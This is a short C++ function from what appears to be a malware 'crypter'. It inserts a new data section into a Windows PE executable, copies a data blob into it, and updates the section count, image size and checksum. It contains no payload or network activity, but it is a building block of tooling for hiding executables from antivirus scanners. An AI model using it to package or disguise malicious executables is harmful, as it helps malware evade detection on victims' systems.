BOOL Crypter::insertSectionConfigInPE(PVOID pvPEBase,DWORD dwPESize,PVOID pvData,DWORD dwDataSize,PVOID *ppvNewPE,DWORD *pdwNewPESize){
	BOOL bRet = FALSE;
	PIMAGE_SECTION_HEADER pNewSection;
	DWORD dwSize;
	if (pNewSection = Crypter::insertSectionHeader( pvPEBase, Crypter::section, dwDataSize, IMAGE_SCN_CNT_INITIALIZED_DATA|IMAGE_SCN_MEM_READ,&dwSize)){
		PVOID pvNewPE;
		DWORD dwNewPESize = pNewSection->PointerToRawData + pNewSection->SizeOfRawData;

		if (pvNewPE = malloc(dwNewPESize)){
			memcpy(pvNewPE, pvPEBase, dwPESize);

			PIMAGE_NT_HEADERS pNtHeaders = RtlImageNtHeader(pvNewPE);

			++(pNtHeaders->FileHeader.NumberOfSections);

			PIMAGE_SECTION_HEADER pVirtualLastSection = Crypter::getVirtualyLastSectionHeader(pNtHeaders);
			pVirtualLastSection[0] = *pNewSection;

			pNtHeaders->OptionalHeader.SizeOfImage += dwSize;

			memcpy((PVOID)((DWORD)pvNewPE + pNewSection->PointerToRawData),pvData,dwDataSize);

			DWORD dwHeaderSum, dwCheckSum;

			if (CheckSumMappedFile(pvNewPE,dwNewPESize,&dwHeaderSum,&dwCheckSum)){
				pNtHeaders->OptionalHeader.CheckSum = dwCheckSum;

				*ppvNewPE = pvNewPE;
				*pdwNewPESize = dwNewPESize;

				bRet = TRUE;
			}

			if (!bRet) free(pvNewPE);
		} else {
			MYPRINTF(" malloc(dwNewPESize)\n");
		}

		free(pNewSection);
	} else {
		MYPRINTF("!insertSectionHeader\n");
	}
	return bRet;
}